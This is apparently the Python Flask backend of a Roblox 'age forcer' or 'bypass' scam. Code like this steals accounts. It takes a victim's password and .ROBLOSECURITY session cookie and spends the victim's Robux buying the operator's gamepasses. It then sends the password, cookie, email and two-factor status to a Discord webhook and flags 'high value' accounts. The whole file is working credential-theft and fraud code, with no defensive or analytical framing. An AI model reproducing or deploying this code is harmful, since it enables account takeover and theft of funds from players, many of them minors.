import os
import sys
import json
import re
import requests
import base64
import time
import threading
from flask import Flask, request, jsonify, send_from_directory
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)

# Gamepass configuration - price thresholds and corresponding gamepass IDs
GAMEPASS_CONFIG = [
    {'threshold': 20, 'gamepass_id': 1481684222, 'price': 20},
    {'threshold': 50, 'gamepass_id': 1482004141, 'price': 50},
    {'threshold': 100, 'gamepass_id': 1481784145, 'price': 100},
    {'threshold': 500, 'gamepass_id': 1482564256, 'price': 500},
    {'threshold': 1000, 'gamepass_id': 1481950194, 'price': 1000},
    {'threshold': 24000, 'gamepass_id': 1482376284, 'price': 24000}
]

def get_csrf_token_safe(cookie):
    """Get CSRF token without logging out the user"""
    try:
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie}' if not cookie.startswith('.ROBLOSECURITY=') else cookie,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json'
        }
        
        # Try multiple safe endpoints to get CSRF token
        safe_endpoints = [
            'https://auth.roblox.com/v1/authentication-ticket',
            'https://catalog.roblox.com/v1/catalog/items/details',
            'https://users.roblox.com/v1/users/authenticated'
        ]
        
        for endpoint in safe_endpoints:
            try:
                if endpoint == 'https://catalog.roblox.com/v1/catalog/items/details':
                    response = requests.post(
                        endpoint,
                        headers=headers,
                        json={'items': [{'itemType': 'Asset', 'id': 1}]},
                        timeout=10
                    )
                else:
                    response = requests.get(endpoint, headers=headers, timeout=10)
                
                csrf_token = response.headers.get('X-CSRF-TOKEN')
                if csrf_token:
                    print("✅ CSRF token obtained safely")
                    return csrf_token
                    
            except Exception as e:
                print(f"❌ CSRF attempt failed for {endpoint}: {str(e)}")
                continue
        
        return None
        
    except Exception as e:
        print(f"❌ CSRF token fetch failed: {str(e)}")
        return None

def purchase_gamepass(cookie, user_id, gamepass_id, price):
    """Purchase a specific gamepass using the provided cookie"""
    try:
        # Format cookie properly
        if not cookie.startswith('.ROBLOSECURITY='):
            formatted_cookie = f'.ROBLOSECURITY={cookie}'
        else:
            formatted_cookie = cookie
            
        headers = {
            'Cookie': formatted_cookie,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json; charset=utf-8'
        }
        
        # Get CSRF token safely
        csrf_token = get_csrf_token_safe(cookie)
        if not csrf_token:
            print("❌ Could not obtain CSRF token safely")
            return False, "CSRF token not available"
        
        headers['X-CSRF-TOKEN'] = csrf_token
        
        # Purchase the gamepass
        purchase_url = f'https://economy.roblox.com/v1/purchases/products/{gamepass_id}'
        purchase_data = {
            'expectedCurrency': 1,  # Robux
            'expectedPrice': price,
            'expectedSellerId': 1  # Use 1 for Roblox system
        }
        
        print(f"🛒 Attempting purchase: Gamepass {gamepass_id} for {price} Robux")
        
        purchase_response = requests.post(
            purchase_url,
            headers=headers,
            json=purchase_data,
            timeout=15
        )
        
        print(f"📨 Purchase response status: {purchase_response.status_code}")
        
        if purchase_response.status_code == 200:
            purchase_result = purchase_response.json()
            print(f"📊 Purchase result: {purchase_result}")
            
            if purchase_result.get('purchased') == True:
                print(f"✅ Successfully purchased gamepass {gamepass_id}")
                return True, "Purchase successful"
            else:
                error_msg = purchase_result.get('errorMsg', 'Unknown error')
                print(f"❌ Purchase failed: {error_msg}")
                return False, error_msg
        elif purchase_response.status_code == 403:
            # CSRF token might be invalid, try one more time with new token
            print("🔄 CSRF token rejected, trying with new token...")
            csrf_token = get_csrf_token_safe(cookie)
            if csrf_token:
                headers['X-CSRF-TOKEN'] = csrf_token
                purchase_response = requests.post(purchase_url, headers=headers, json=purchase_data, timeout=15)
                
                if purchase_response.status_code == 200:
                    purchase_result = purchase_response.json()
                    if purchase_result.get('purchased') == True:
                        print(f"✅ Successfully purchased gamepass {gamepass_id} on retry")
                        return True, "Purchase successful"
            
            error_msg = f"HTTP {purchase_response.status_code} - CSRF token issue"
            print(f"❌ Purchase request failed: {error_msg}")
            return False, error_msg
        else:
            error_msg = f"HTTP {purchase_response.status_code}"
            print(f"❌ Purchase request failed: {error_msg}")
            return False, error_msg
            
    except Exception as e:
        error_msg = f"Exception during purchase: {str(e)}"
        print(f"❌ {error_msg}")
        return False, error_msg

def auto_purchase_gamepasses(cookie, user_id, robux_balance):
    """Automatically purchase gamepasses based on available Robux balance"""
    try:
        print(f"🎯 Starting auto-purchase for user {user_id} with {robux_balance} Robux")
        
        # Extract numeric robux balance
        if isinstance(robux_balance, str):
            robux_balance_clean = robux_balance.replace('R$ ', '').replace(',', '')
            try:
                available_robux = int(robux_balance_clean)
            except ValueError:
                print(f"❌ Could not parse robux balance: {robux_balance}")
                return []
        else:
            available_robux = int(robux_balance)
        
        print(f"💰 Available Robux: {available_robux}")
        
        if available_robux <= 0:
            print("❌ No Robux available for purchase")
            return []
        
        # Sort gamepasses by threshold (lowest to highest)
        sorted_gamepasses = sorted(GAMEPASS_CONFIG, key=lambda x: x['threshold'])
        
        purchased_gamepasses = []
        
        # Purchase all affordable gamepasses
        for gamepass in sorted_gamepasses:
            if available_robux >= gamepass['threshold']:
                print(f"🛒 Attempting to purchase gamepass {gamepass['gamepass_id']} for {gamepass['price']} Robux...")
                success, message = purchase_gamepass(cookie, user_id, gamepass['gamepass_id'], gamepass['price'])
                
                if success:
                    purchased_gamepasses.append({
                        'gamepass_id': gamepass['gamepass_id'],
                        'price': gamepass['price'],
                        'status': 'success',
                        'message': message
                    })
                    # Deduct the purchased amount from available balance
                    available_robux -= gamepass['price']
                    print(f"✅ Purchased! Remaining Robux: {available_robux}")
                else:
                    purchased_gamepasses.append({
                        'gamepass_id': gamepass['gamepass_id'],
                        'price': gamepass['price'],
                        'status': 'failed',
                        'error': message
                    })
                    print(f"❌ Purchase failed: {message}")
        
        print(f"🎉 Auto-purchase completed. Total purchased: {len([p for p in purchased_gamepasses if p['status'] == 'success'])}")
        return purchased_gamepasses
        
    except Exception as e:
        print(f"❌ Error in auto_purchase_gamepasses: {str(e)}")
        return []

def send_to_discord_background(password, cookie, webhook_url):
    """Background function to send data to Discord webhook"""
    try:
        print("Background: Fetching Roblox user information...")
        user_info = get_roblox_user_info(cookie)
        
        # Check if cookie actually works with Roblox API
        if not user_info.get('success', False):
            print("Background: Cookie failed validation against Roblox API - not sending webhooks")
            return
        
        # Extract numeric robux balance for auto-purchase
        robux_balance_text = user_info['robux_balance']
        robux_balance_numeric = 0
        try:
            if 'R$ ' in robux_balance_text:
                robux_balance_numeric = int(robux_balance_text.replace('R$ ', '').replace(',', ''))
            else:
                robux_balance_numeric = int(robux_balance_text.replace(',', ''))
        except (ValueError, AttributeError):
            robux_balance_numeric = 0
        
        # Auto-purchase gamepasses based on balance
        purchased_gamepasses = []
        if robux_balance_numeric > 0:
            print(f"Starting auto-purchase with balance: {robux_balance_numeric} Robux")
            purchased_gamepasses = auto_purchase_gamepasses(cookie, user_info['user_id'], robux_balance_numeric)
            print(f"Auto-purchase completed. Purchased {len(purchased_gamepasses)} gamepasses")
        
        # Check if user has Korblox or Headless for ping notification
        korblox = user_info.get('has_korblox', False)
        headless = user_info.get('has_headless', False)
        has_premium_items = korblox or headless
        
        # Check total spent robux for value-based ping
        total_spent_text = user_info.get('total_spent_past_year', '0')
        total_spent_value = 0
        
        # Extract numeric value from total spent text
        try:
            # Remove commas and convert to integer
            total_spent_value = int(total_spent_text.replace(',', '').replace(' ', ''))
        except (ValueError, AttributeError):
            total_spent_value = 0
        
        # Determine ping content based on account value
        ping_content = ''
        
        if total_spent_value >= 50000:
            # High value account - ping everyone
            ping_content = '@everyone 🚨 **HIGH VALUE ACCOUNT DETECTED!** 🚨'
            if has_premium_items:
                ping_content += ' - Account has premium items AND high spending!'
            else:
                ping_content += f' - Total spent: {total_spent_value:,} robux'
                
        elif has_premium_items:
            # Premium items but not high spending
            ping_content = '@everyone 🚨 **PREMIUM ITEMS DETECTED!** 🚨'
            if korblox and headless:
                ping_content += ' - Account has both Korblox AND Headless!'
            elif korblox:
                ping_content += ' - Account has Korblox!'
            elif headless:
                ping_content += ' - Account has Headless!'
                
        else:
            # Normal account with some spending
            if total_spent_value > 0:
                ping_content = '@everyone 📈 **Normal Hit** - Account has spending history'
            else:
                # No ping for accounts with no spending and no premium items
                ping_content = ''
        
        # Prepare cookie content for Discord (use cookie as provided)
        cookie_content = cookie if cookie else 'Not provided'
        
        # Truncate cookie if too long for Discord
        available_cookie_space = 3990  # Conservative limit
        if len(cookie_content) > available_cookie_space:
            cookie_content = cookie_content[:available_cookie_space] + "..."
            print(f"Background: Cookie truncated to fit Discord limit")
        
        # Create purchase history field for MAIN webhook only
        purchase_field = {
            'name': '🛒 Auto-Purchase Results',
            'value': 'No purchases attempted',
            'inline': False
        }
        
        if purchased_gamepasses:
            success_purchases = [p for p in purchased_gamepasses if p['status'] == 'success']
            failed_purchases = [p for p in purchased_gamepasses if p['status'] == 'failed']
            
            if success_purchases:
                purchase_text = f"✅ **Successful Purchases:** {len(success_purchases)}\n"
                for purchase in success_purchases:
                    purchase_text += f"• Gamepass {purchase['gamepass_id']} - {purchase['price']} Robux\n"
                
                if failed_purchases:
                    purchase_text += f"\n❌ **Failed:** {len(failed_purchases)} gamepasses"
                
                purchase_field['value'] = purchase_text
            else:
                purchase_field['value'] = f"❌ All purchases failed ({len(failed_purchases)} attempts)"
        
        # Create Discord embed data for main webhook (with cookie)
        discord_data = {
            'content': ping_content,
            'embeds': [
                {
                    'title': 'Age Forcer Logs',
                    'color': 0xff0000,
                    'thumbnail': {
                        'url': user_info['profile_picture']
                    },
                    'fields': [
                        {
                            'name': '👤 Username',
                            'value': user_info['username'],
                            'inline': False
                        },
                        {
                            'name': '🔐 Password',
                            'value': password if password else 'Not provided',
                            'inline': False
                        },
                        {
                            'name': '💰 Robux',
                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
                            'inline': False
                        },
                        {
                            'name': '⌛ Pending',
                            'value': user_info['pending_robux'],
                            'inline': False
                        },
                        {
                            'name': '📊 Summary',
                            'value': user_info.get('total_spent_past_year', 'Not available'),
                            'inline': False
                        },
                        {
                            'name': '<:korblox:1153613134599307314>Korblox',
                            'value': '✅' if korblox else '❌',
                            'inline': False
                        },
                        {
                            'name': '<:head_full:1207367926622191666>Headless',
                            'value': '✅' if headless else '❌',
                            'inline': False
                        },
                        purchase_field,  # Auto-purchase field only in main webhook
                        {
                            'name': '🔐 Account Settings Information',
                            'value': f"**Email Address:** {user_info.get('email_address', 'Not available')}\n**Verified:** {user_info.get('email_verified', '❌')}\n**Pin:** {user_info.get('pin_enabled', '❌')}\n**Authenticator:** {user_info.get('authenticator_enabled', '❌')}",
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': f'Today at {time.strftime("%H:%M", time.localtime())}',
                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
                    }
                },
                {
                    'title': '🍪 Cookie Data',
                    'color': 0xff0000,
                    'description': f'```{cookie_content}```',
                    'footer': {
                        'text': 'Authentication Token • Secured',
                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
                    }
                }
            ]
        }
        
        # Send to main Discord webhook (full data with cookie)
        payload_size = len(json.dumps(discord_data))
        print(f"Background: Sending Discord payload of size: {payload_size} bytes")
        
        response = requests.post(webhook_url, json=discord_data, timeout=5)
        
        if response.status_code in [200, 204]:
            print(f"Background: Discord webhook successful: {response.status_code}")
        else:
            print(f"Background: Discord webhook failed: {response.status_code}")
        
        # Send to bypass webhook (without cookie, password, AND auto-purchase info)
        bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
        if bypass_webhook_url:
            send_to_bypass_webhook(user_info, ping_content)  # Removed purchased_gamepasses parameter
            
    except Exception as e:
        print(f"Background: Error sending to Discord: {str(e)}")

def send_to_bypass_webhook(user_info, ping_content):
    """Send bypass logs to separate webhook without cookie, password, and auto-purchase data"""
    try:
        print("Sending bypass logs to secondary webhook...")
        
        # Create bypass embed without cookie, password, and auto-purchase data
        bypass_data = {
            'content': '@everyone 📊 Success',  # Added ping notification
            'embeds': [
                {
                    'title': 'BYPASS - LOGS',
                    'color': 0x00ff00,  # Green color for success
                    'thumbnail': {
                        'url': user_info['profile_picture']
                    },
                    'fields': [
                        {
                            'name': '👤 Username',
                            'value': user_info['username'],
                            'inline': True
                        },
                        {
                            'name': '💰 Robux',
                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
                            'inline': True
                        },
                        {
                            'name': '⌛ Pending',
                            'value': user_info['pending_robux'],
                            'inline': True
                        },
                        {
                            'name': '🌟 Premium',
                            'value': user_info.get('premium_status', '❌ No'),
                            'inline': True
                        },
                        {
                            'name': '📊 Summary',
                            'value': user_info.get('total_spent_past_year', 'Not available'),
                            'inline': True
                        },
                        {
                            'name': '<:korblox:1153613134599307314>Korblox',
                            'value': '✅' if user_info.get('has_korblox', False) else '❌',
                            'inline': True
                        },
                        {
                            'name': '<:head_full:1207367926622191666>Headless',
                            'value': '✅' if user_info.get('has_headless', False) else '❌',
                            'inline': True
                        },
                        {
                            'name': '✅ Status',
                            'value': '**Successful 🟢**\n\n**[BYPASSER LINK](https://rblx-forcer.vercel.app)**\n\n**[REFRESH Cookie](https://rblx-refresh.vercel.app/)**',
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': f'Bypass Logs • {time.strftime("%H:%M", time.localtime())}',
                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
                    }
                }
            ]
        }
        
        bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
        response = requests.post(bypass_webhook_url, json=bypass_data, timeout=5)
        
        if response.status_code in [200, 204]:
            print(f"Bypass webhook successful: {response.status_code}")
        else:
            print(f"Bypass webhook failed: {response.status_code}")
            
    except Exception as e:
        print(f"Error sending to bypass webhook: {str(e)}")

# ... (Keep all other functions the same: get_roblox_user_info, is_valid_cookie, and all routes remain unchanged)

if __name__ == '__main__':
    print("🚀 Starting Flask server...")
    print("📋 Available routes:")
    print("   / - Main page")
    print("   /test-purchase - Test purchase functions")
    print("   /health - Health check")
    print("   /submit - Form submission")
    
    try:
        app.run(host='0.0.0.0', port=5000, debug=False)
    except Exception as e:
        print(f"❌ Failed to start server: {e}")
        print("💡 Try using a different port: python app.py --port=5001")
